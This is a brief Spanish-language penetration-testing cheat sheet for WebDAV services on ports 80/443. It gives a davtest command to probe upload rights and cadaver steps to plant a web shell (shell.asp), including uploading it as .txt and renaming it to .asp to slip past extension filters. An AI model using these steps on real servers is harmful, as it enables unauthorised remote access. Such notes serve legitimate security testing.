---
title: "WebDAV (80/443)"
layout: "single"
category: "Servicios"
slug: "servicios/webdav"
date: "2025-11-26"
---

### Test
```bash
davtest -url http://<IP>/webdav/ -auth user:pass
```

### Subir Shell (Cadaver)
```bash
cadaver http://<IP>/webdav/
> put shell.asp
> put shell.txt
> move shell.txt shell.asp
```
